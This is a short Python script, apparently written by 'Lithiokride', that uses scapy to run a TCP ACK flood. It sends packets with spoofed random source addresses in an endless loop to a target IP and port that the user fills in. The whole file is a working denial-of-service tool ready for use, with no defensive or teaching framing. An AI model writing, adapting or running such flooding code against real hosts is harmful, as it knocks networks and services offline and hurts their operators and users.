from scapy.all import IP, TCP, send
import random
# Written by Lithiokride

# Target IP and Port
target_ip = "192.168.1.1"  # Replace with the target's IP
target_port = 80            # Replace with the target's port

# Function to create and send ACK packets
def ack_flood(target_ip, target_port):
    # Send ACK packets in a loop
    while True:
        # Generate a random source IP address
        source_ip = f"192.168.1.{random.randint(1, 254)}"  # Change the range as needed

        # Create IP layer
        ip = IP(src=source_ip, dst=target_ip)

        # Create TCP layer with ACK flag set
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags='A', seq=random.randint(1, 10000))

        # Create and send the packet
        packet = ip/tcp
        send(packet, verbose=0)

# Start the ACK Flood
ack_flood(target_ip, target_port)
